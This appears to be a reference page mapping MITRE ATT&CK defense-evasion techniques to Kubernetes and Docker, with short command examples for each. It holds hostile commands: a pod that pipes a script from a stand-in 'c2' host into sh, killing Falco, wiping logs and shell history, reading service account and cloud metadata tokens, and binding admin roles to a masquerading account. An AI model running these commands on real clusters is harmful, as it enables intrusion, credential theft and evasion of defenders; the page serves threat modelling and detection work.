# Defense Evasion

### **Defense Evasion Techniques in Containerized Environments**

In Kubernetes and Docker environments, adversaries use Defense Evasion techniques to avoid detection, bypass security controls, and blend in with legitimate operations. This includes modifying security tooling, deploying containers with stealthy attributes, hijacking tokens, using default accounts, or abusing naming conventions to appear benign.

#### Build Image on Host (T1610.001)

**Description**: Adversaries build container images on compromised hosts to evade static scanning or registry controls.

**Container Example**:

*   Attacker builds a malicious image locally (host or inside a compromised pod) to avoid detection in CI/CD or image scanning:

    ```bash
    docker build -t stealth-backdoor .
    docker tag stealth-backdoor localhost:5000/nginx
    ```
* Pushes to a private registry or loads directly onto nodes with Docker.

**Benefit**: Avoids scrutiny from tools like Trivy, Clair, or Notary since the image never leaves local scope or uses signed channels.

#### 🐳 Deploy Container (T1610)

**Description**: Deploys containers with malicious behavior, often disguised as benign apps or sidecars.

**Container Example**:

*   Deploys `alpine:latest` or `busybox` with post-deployment behavior like:

    ```bash
    kubectl run benign --image=alpine -- sh -c "curl http://c2/implant.sh | sh"
    ```
* Embeds malware in initContainers or ephemeral Jobs.

**Evasion Angle**: Looks like a harmless system utility or diagnostic pod to blue teams.

#### Impair Defenses → **Disable or Modify Tools (T1562.001)**

**Description**: Modifies or disables container-native defenses like Falco, auditd, seccomp, or AppArmor.

**Container Example**:

*   Kill Falco process in host or remove binary in shared container:

    ```bash
    pkill falco
    rm /etc/falco/falco.yaml
    ```
*   Modify `kube-apiserver` flags to remove audit logging:

    ```bash
    --audit-log-path=""
    ```

**In Kubernetes**:

* Patch a DaemonSet or agent with a malicious image that disables or replaces logging tools.

#### Indicator Removal (T1070)

**Description**: Delete logs, shell history, or artifacts to cover tracks.

**Container Example**:

*   Inside compromised pod or host-mounted volume:

    ```bash
    bashCopyEdithistory -c
    rm -rf /var/log/*
    echo "" > ~/.bash_history
    ```

**Bonus**: Use ephemeral containers or Jobs that auto-delete post execution.

#### 🎭 Masquerading → **Match Legitimate Name or Location (T1036.005)**

**Description**: Name workloads, images, or files to resemble legitimate processes or components.

**Container Example**:

*   Deploys a malicious pod named `metrics-server`, `nginx`, or `dns`:

    ```bash
    kubectl run metrics-server --image=evilcorp/backdoor:latest
    ```

**Other tactics**:

* Drop files like `sshd`, `kubelet`, or `update.sh` in known system paths (`/usr/bin`, `/etc/init.d`).

***

#### 🎭 Masquerading → **Masquerade Account Name (T1036.003)**

**Description**: Create service accounts or usernames that resemble legitimate identities.

**Container Example**:

*   Create a service account named `monitoring-bot`, `grafana-agent`, or `backup-admin`:

    ```bash
    kubectl create serviceaccount grafana-agent
    ```
*   Assign subtle elevated roles:

    ```bash
    kubectl create clusterrolebinding grafana-agent --clusterrole=admin --serviceaccount=default:grafana-agent
    ```

#### Use Alternate Authentication Material → **Application Access Token (T1550.001)**

**Description**: Steal and reuse Kubernetes service account tokens, cloud API keys, or internal OAuth tokens.

**Container Example**:

*   Dump Kubernetes token:

    ```bash
    cat /var/run/secrets/kubernetes.io/serviceaccount/token
    ```
*   Use compromised token externally to query cluster:

    ```bash
    curl -k -H "Authorization: Bearer $TOKEN" https://<api-server>/api/v1/nodes
    ```
* In cloud-native environments, steal tokens from:
  * GCP: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
  * AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

***

#### Valid Accounts → **Default Accounts (T1078.001)**

**Description**: Use preexisting default service accounts or known application credentials.

**Container Example**:

* Exploit default service account permissions (e.g., `default` in `default` namespace).
*   Reuse default passwords in exposed dashboards (e.g., ArgoCD, Jenkins):

    ```bash
    Username: admin
    Password: admin
    ```

**Persistence Angle**: Often overlooked by developers; rare to rotate or revoke.

***

#### Valid Accounts → **Local Accounts (T1078.003)**

**Description**: Use known or created user accounts on container hosts or in images.

**Container Example**:

* SSH into K8s node with leaked credentials (e.g., `ubuntu:ubuntu` on test images).
* Drop your SSH key into `/root/.ssh/authorized_keys` via hostPath mount or privileged pod.

### 🔎 Summary Table

| Technique                   | Sub-Technique     | Containerized Use Case                                 |
| --------------------------- | ----------------- | ------------------------------------------------------ |
| Build Image on Host         | —                 | Build image on node to bypass scanners                 |
| Deploy Container            | —                 | Launch disguised malicious pod (e.g., `alpine`)        |
| Disable or Modify Tools     | —                 | Kill Falco, modify audit settings                      |
| Indicator Removal           | —                 | Delete logs or command history                         |
| Masquerade Name/Location    | —                 | Name pod `metrics-server`, place scripts in `/usr/bin` |
| Masquerade Account Name     | —                 | Use service account `grafana-agent` for cluster access |
| Use Alternate Auth Material | Application Token | Steal SA tokens or cloud metadata tokens               |
| Valid Accounts              | Default Accounts  | Abuse `default` service accounts or dashboard logins   |
| Valid Accounts              | Local Accounts    | SSH into node using local user access or keys          |
